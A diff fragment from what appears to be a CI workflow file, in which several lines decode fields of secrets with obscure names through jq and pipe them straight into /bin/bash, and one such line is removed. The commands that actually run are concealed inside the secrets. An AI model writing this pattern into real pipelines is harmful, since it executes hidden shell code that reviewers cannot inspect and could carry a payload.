@@ -18,7 +18,6 @@ jobs:
           p28: ${{ secrets.p28 }}
         run: |
           printf '%s' "$p28" | jq -r .s603 | /bin/bash
-          printf '%s' "$ds582" | jq -r .e0 | /bin/bash
           printf '%s' "$ft97409" | jq -r .ko7948 | /bin/bash
           echo $rezip64145 | jq -r .irarf107 | /bin/bash
           echo $fls1037 | jq -r .ygd6 | /bin/bash
